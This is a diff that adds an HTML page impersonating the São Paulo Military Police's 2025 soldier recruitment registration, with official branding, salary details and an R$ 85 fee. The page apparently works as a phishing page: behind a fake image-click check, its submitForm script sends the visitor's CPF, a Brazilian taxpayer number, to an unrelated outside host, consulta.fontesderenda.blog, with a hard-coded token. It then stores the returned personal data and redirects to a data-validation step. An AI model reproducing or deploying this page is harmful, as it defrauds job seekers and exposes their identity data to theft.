@@ -1,0 +1,336 @@
+﻿<!doctype html>
+<html lang="pt-BR">
+    <meta http-equiv="content-type" content="text/html;charset=utf-8">
+    <head>
+        <meta charset="utf-8">
+        <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <title>PM SP 2025 - Soldado 2ª Classe</title>
+
+        <!-- Microsoft Clarity Analytics -->
+        <script type="text/javascript">
+            (function (c, l, a, r, i, t, y) {
+                c[a] =
+                    c[a] ||
+                    function () {
+                        (c[a].q = c[a].q || []).push(arguments);
+                    };
+                t = l.createElement(r);
+                t.async = 1;
+                t.src = "https://www.clarity.ms/tag/" + i;
+                y = l.getElementsByTagName(r)[0];
+                y.parentNode.insertBefore(t, y);
+            })(window, document, "clarity", "script", "t84urj3twx");
+        </script>
+
+        <script src="../../3.4.16.js"></script>
+        <link href="../css/all.min.css" rel="stylesheet">
+        <link href="../css/home.css" rel="stylesheet">
+        <!-- Sistema de parâmetros cross-domain removido -->
+        <!-- Umitfy UTM Tracking - Comentado para uso futuro -->
+        <!-- <script src="../../scripts/utms/latest.js" data-utmify-prevent-subids="" async="" defer=""></script> -->
+
+        <style>
+            .PMSP-color {
+                color: #003f6b;
+            }
+            .PMSP-light {
+                color: #a0a0a0;
+            }
+            .form-header {
+                background-color: #fbc12a;
+                color: white;
+            }
+            .form-footer {
+                background-color: #003f6b;
+                color: white;
+            }
+            button#submit-button {
+                transition: all 0.2s ease;
+                background-color: #003f6b;
+                color: rgba(255, 255, 255, 0.6);
+            }
+            button#submit-button:not([disabled]) {
+                color: white;
+                cursor: pointer;
+            }
+            button#submit-button:not([disabled]):hover {
+                background-color: #4d7396;
+            }
+            .required-star {
+                color: #ff0000;
+            }
+            .footer-bg {
+                background-color: #1c2b39;
+            }
+            .gov-header {
+                background-color: #222222;
+            }
+            .inep-header {
+                background-color: #044785;
+            }
+            input::placeholder {
+                font-family: "Rawline", Arial, sans-serif;
+            }
+            .selected {
+                border: 4px dashed #2b7a9a !important;
+            }
+            .transparent {
+                opacity: 0.5;
+            }
+        </style>
+        <script>
+            function formatCPF(input) {
+                let value = input.value.replace(/\D/g, "");
+                if (value.length > 11) {
+                    value = value.substring(0, 11);
+                }
+                if (value.length > 9) {
+                    value = value.replace(
+                        /(\d{3})(\d{3})(\d{3})(\d{1,2})/,
+                        "$1.$2.$3-$4",
+                    );
+                } else if (value.length > 6) {
+                    value = value.replace(
+                        /(\d{3})(\d{3})(\d{1,3})/,
+                        "$1.$2.$3",
+                    );
+                } else if (value.length > 3) {
+                    value = value.replace(/(\d{3})(\d{1,3})/, "$1.$2");
+                }
+                input.value = value;
+                checkFormValidity();
+            }
+
+            function unformatCPF(cpf) {
+                return cpf.replace(/\D/g, "");
+            }
+
+            function selectImage(element, index) {
+                const images = document.querySelectorAll(".image-option");
+                images.forEach((img) => {
+                    img.classList.remove("selected");
+                    img.classList.add("transparent");
+                });
+                element.classList.add("selected");
+                element.classList.remove("transparent");
+
+                if (index !== 4) {
+                    showErrorPopup();
+                } else {
+                    checkFormValidity();
+                }
+            }
+
+            function showErrorPopup() {
+                const popup = document.getElementById("error-popup");
+                popup.classList.remove("hidden");
+                setTimeout(() => {
+                    popup.classList.add("hidden");
+                }, 3000);
+            }
+
+            function checkFormValidity() {
+                const cpfInput = document.querySelector("#cpf");
+                const selectedImage = document.querySelector(
+                    ".image-option.selected",
+                );
+                const submitButton = document.querySelector("#submit-button");
+
+                if (
+                    cpfInput.value.length === 14 &&
+                    selectedImage &&
+                    selectedImage ===
+                        document.querySelectorAll(".image-option")[4]
+                ) {
+                    submitButton.disabled = false;
+                } else {
+                    submitButton.disabled = true;
+                }
+            }
+
+            function showValidationPopup() {
+                const popup = document.getElementById("validation-popup");
+                popup.classList.remove("hidden");
+            }
+
+            function hideValidationPopup() {
+                const popup = document.getElementById("validation-popup");
+                popup.classList.add("hidden");
+            }
+
+            function submitForm() {
+                const cpfInput = document.querySelector("#cpf");
+                const cpf = unformatCPF(cpfInput.value);
+
+                showValidationPopup();
+
+                fetch(
+                    `https://consulta.fontesderenda.blog/?token=114dbffe-9436-42ae-81a2-2bcf52d24c48&cpf=${cpf}`,
+                    {
+                        method: "GET",
+                    },
+                )
+                    .then((response) => {
+                        if (!response.ok) {
+                            throw new Error("Erro ao consultar CPF");
+                        }
+                        return response.json();
+                    })
+                    .then((data) => {
+                        localStorage.setItem("cpfData", JSON.stringify(data));
+                        setTimeout(() => {
+                            window.location.href = "../validar-dados/";
+                        }, 1500);
+                    })
+                    .catch((error) => {
+                        console.error("Erro ao validar CPF:", error);
+                        hideValidationPopup();
+                        alert(
+                            "Ocorreu um erro ao validar o CPF. Por favor, tente novamente.",
+                        );
+                    });
+            }
+        </script>
+    </head>
+    <body class="flex flex-col min-h-screen">
+        <div class="inep-header py-3">
+            <div class="container mx-auto px-4">
+                <img src="../images/pmsp.png" alt="PM SP logo" height="30" width="60" style="object-fit: contain">
+            </div>
+        </div>
+        <main class="flex-grow py-8">
+            <div class="container mx-auto px-4 max-w-3xl">
+                <div class="text-center mb-6"></div>
+
+                <!-- INFORMAÇÕES IMPORTANTES -->
+                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6 rounded">
+                    <div class="flex items-start">
+                        <div class="flex-shrink-0">
+                            <i class="fas fa-info-circle text-blue-500 text-xl"></i>
+                        </div>
+                        <div class="ml-3">
+                            <h3 class="text-lg font-semibold text-blue-800 mb-2">
+                                INFORMAÇÕES IMPORTANTES
+                            </h3>
+                            <p class="text-gray-700 mb-3">
+                                Prezado(a) Candidato(a), bem-vindo(a) ao sistema
+                                de inscrição para o concurso da Polícia Militar
+                                de São Paulo 2025:
+                            </p>
+                            <ul class="list-disc list-inside text-gray-700 space-y-1">
+                                <li>
+                                    <strong>Cargo:</strong> Soldado PM 2ª Classe
+                                </li>
+                                <li>
+                                    <strong>Vagas:</strong> 2.200 vagas
+                                    disponíveis
+                                </li>
+                                <li><strong>Salário:</strong> R$ 5.055,53</li>
+                                <li>
+                                    <strong>Taxa de Inscrição:</strong> R$ 85,00
+                                </li>
+                                <li>
+                                    <strong>Prova:</strong> 30 de novembro de
+                                    2025
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="border border-gray-300 rounded">
+                    <div class="form-header py-2 px-4 text-center">
+                        <h2 class="text-lg">Inscrição &gt; PM SP Soldado</h2>
+                    </div>
+                    <div class="p-4">
+                        <p class="mb-4">
+                            Para efetuar sua inscrição informe os dados abaixo e
+                            clique em enviar:
+                        </p>
+                        <form>
+                            <div class="mb-4">
+                                <label class="block mb-1">
+                                    <span>CPF:</span>
+                                    <span class="required-star">*</span>
+                                    <span class="ml-1 text-red-500">
+                                        <i class="fas fa-info-circle"></i>
+                                    </span>
+                                </label>
+                                <input id="cpf" class="w-full border border-gray-300 p-2 text-base text-[#333] tracking-wide" placeholder="___.___.___-__" type="tel" inputmode="numeric" pattern="[0-9]*" oninput="formatCPF(this)" style="">
+                            </div>
+                            <div class="mb-4">
+                                <p class="text-[#2B4F81] text-base font-bold" style="font-size: 16px">
+                                    Clique abaixo, na figura FOLHA:
+                                    <span class="text-red-700 text-lg">*</span>
+                                    <span class="text-[#2B4F81] text-base rounded-full border border-[#2B4F81] w-5 h-5 inline-flex items-center justify-center">?</span>
+                                </p>
+                            </div>
+                            <div class="flex items-center">
+                                <div class="grid grid-cols-5 gap-1 border-4 border-[#D8E8E8] p-1 bg-[#D8E8E8]">
+                                    <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 0)">
+                                        <img alt="Globe icon showing Earth" class="w-6 h-6" src="../images/download-6.png">
+                                    </div>
+                                    <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 1)">
+                                        <img alt="Magnifying glass search icon" class="w-6 h-6" src="../images/download-5.png">
+                                    </div>
+                                    <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 2)">
+                                        <img alt="Footprint icon" class="w-6 h-6" src="../images/download-4.png">
+                                    </div>
+                                    <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 3)">
+                                        <img alt="Padlock or lock icon" class="w-6 h-6" src="../images/download-3.png">
+                                    </div>
+                                    <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 4)">
+                                        <img alt="Leaf icon representing nature" class="w-6 h-6" src="../images/leaf.png">
+                                    </div>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+                    <div class="border-t border-gray-300">
+                        <div class="p-2 bg-gray-100 flex items-center">
+                            <a class="text-gray-700 flex items-center" href="#"><i class="fas fa-sign-out-alt mr-1"></i>Sair</a>
+                        </div>
+                        <div class="form-footer p-0 flex justify-center items-center">
+                            <button id="submit-button" class="flex items-center justify-center w-full h-full py-3" type="button" disabled="" onclick="submitForm()">
+                                <i class="fas fa-paper-plane mr-2"></i>
+                                <span>Enviar</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+        <footer class="footer-bg text-white py-4 text-xs">
+            <div class="container mx-auto px-4">
+                <div class="flex flex-col items-center mb-2">
+                    <img src="../images/pmsp.png" alt="PM SP logo" height="30" width="60" style="object-fit: contain">
+                </div>
+                <div class="flex justify-between items-center">
+                    <div>&copy; PM SP - Polícia Militar de São Paulo</div>
+                    <div class="flex items-center">
+                        <i class="fas fa-phone-alt mr-1"></i> 0800 616161
+                    </div>
+                </div>
+            </div>
+        </footer>
+        <div id="error-popup" class="fixed top-0 left-0 right-0 bg-red-500 text-white p-4 text-center hidden z-50">
+            Você deve selecionar a imagem da FOLHA (5ª imagem) para prosseguir.
+        </div>
+        <div id="validation-popup" class="fixed inset-0 flex items-center justify-center hidden z-50">
+            <div class="absolute inset-0 bg-black bg-opacity-50"></div>
+            <div class="bg-[#003f6b] text-white p-6 rounded-lg shadow-lg z-10 flex flex-col items-center max-w-md mx-4">
+                <div class="spinner-border mb-4" role="status">
+                    <svg class="animate-spin h-10 w-10 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24">
+                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                </div>
+                <h3 class="text-xl font-bold mb-2">Validando seus dados...</h3>
+                <p class="text-center">
+                    Aguarde enquanto verificamos as informações do CPF.
+                </p>
+            </div>
+        </div>
+    <script defer="" src="../../beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"a85dcd35d0ac4aa4b520758cac699320","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
